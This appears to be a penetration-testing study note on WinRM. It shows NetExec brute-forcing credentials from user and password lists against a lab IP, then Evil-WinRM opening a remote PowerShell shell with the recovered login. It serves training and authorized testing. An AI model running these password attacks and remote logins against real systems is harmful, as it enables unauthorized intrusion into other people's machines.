# WinRM

## NetExec

A tool that can be used for password attacks against WinRM is **NetExec**, which can also be used for other protocols such as **SMB**, **LDAP**, **MSSQL**, and others.

An example of attacking a WinRM endpoint using NetExec:

```shell
clue@machine[/]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

## Evil-WinRM

```shell
clue@machine[/]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

If the login was successful, a terminal session is initialised using the **PowerShell Remoting Protoco**l (**MS-PSRP**), which simplifies the operation and execution of commands.
